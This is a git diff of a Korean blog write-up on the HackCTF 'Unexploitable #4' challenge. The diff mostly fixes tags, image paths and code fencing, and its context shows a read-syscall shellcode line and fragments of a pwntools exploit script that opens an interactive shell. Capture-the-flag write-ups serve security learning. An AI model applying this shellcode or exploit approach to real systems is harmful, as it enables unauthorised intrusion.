@@ -3,7 +3,7 @@ layout: post
 title:  "HacCTF Unexploitable #4 write-up"
 date:   2020-03-21 19:45:55
 image:  hackctf_unex4.PNG
-tags:   [Hackctf]
+tags:   [HackCTF]
 categories: [Write-up]
 ---
 
@@ -174,16 +174,16 @@ read함수를 호출하는 쉘코드는 다음을 이용하였다.
 
 - shellcode= "mov esi, 0x6010c0; mov edx, 0x400; syscall; ret;"
 
-![HackCTF%20Unexploitable%204/Untitled%2011.png](HackCTF%20Unexploitable%204/Untitled%2011.png)
+![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%2011.png)
 
 위 사진은 sys_read 쉘코드로 ret된 상황이다. 운좋게 rax가 이때 0인것을 확인했기 때문에 execve쉘코드를 저장할 rsi 주소만 주고, 사이즈를 크게 0x400정도 주었다.
 
-![HackCTF%20Unexploitable%204/Untitled%2012.png](HackCTF%20Unexploitable%204/Untitled%2012.png)
+![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%204/Untitled%2012.png)
 
 그렇게 되면 0x6010c0의 주소에 쉘코드가 정상적으로 들어가게 되고 실행이 된다.
 
 최종 익스코드는 다음과 같다
-
+    ```python    
     from pwn import *
     import time
     #p=remote("ctf.j0n9hyun.xyz",3039)
@@ -213,3 +213,4 @@ read함수를 호출하는 쉘코드는 다음을 이용하였다.
     p.sendline(shell)
     
     p.interactive()
+    ```
